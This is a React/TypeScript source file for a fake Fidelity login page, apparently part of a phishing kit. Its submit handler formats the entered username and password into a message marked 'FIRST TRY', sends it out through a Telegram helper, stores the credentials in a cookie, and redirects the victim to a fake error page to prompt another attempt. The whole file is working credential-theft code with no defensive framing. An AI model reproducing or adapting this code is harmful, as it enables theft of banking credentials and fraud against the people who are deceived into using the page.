import React from "react";
import fid from "../assets/fidelity.svg";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";

export default function Login() {
  const [isLoading, setIsLoading] = React.useState(false);
  const [formInput, setFormInput] = React.useState<Login>({
    username: "",
    password: "",
  });

  const navigate = useNavigate();

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    
    const message = `
        ---- FIDELITY (FIRST TRY) -----
        Username: ${formInput.username}
        Password: ${formInput.password}
        `;
    setIsLoading(true);
    await TelegramSend(message);
    cookies.set("login1", formInput);
    setIsLoading(false);
    navigate("../login/error", { replace: true });
  }

  return (
    <>
      <div className="navbar">
        <div className="brand">
          <div>
            <img src={fid} alt="" />
          </div>
        </div>

        <div className="nav-texts">
          <p style={{ marginRight: 20 }}>Security</p>
          <p>FAQ</p>
        </div>
      </div>

      <div className="content">
        <div className="form">
          <form method="POST" onSubmit={handleSubmit} >
            <div className="form-item">
              <h2>Log in</h2>
             
                <div className="form-field">
                  <label htmlFor="">Username</label>
                  <input
                    onChange={handleInputChange}
                    name="username"
                    type="text"
                  />
                </div>

                <div className="form-field">
                  <label htmlFor="">Password</label>
                  <input
                    onChange={handleInputChange}
                    type="password"
                    name="password"
                  />
                </div>

                <div style={{ display: "flex", alignItems: "center" }}>
                  <input
                    style={{ width: 15, height: 15, marginRight: 5 }}
                    type="checkbox"
                  />{" "}
                  <p>Remember my username</p>
                </div>
                {isLoading ? (
                  <div className="form-field">
                    <button type="button">Please wait...</button>
                  </div>
                ) : (
                  <div className="form-field">
                    <button type="submit">Log in</button>
                  </div>
                )}

                <a href="">Forgot username or password?</a>
              
            </div>
          </form>
        </div>
      </div>

      <div className="footer">
        <p style={{ textAlign: "center" }}>
          New to Fidelity? <a href="">Open an account</a> or{" "}
          <a href="">sign up</a>
        </p>
      </div>
    </>
  );
}
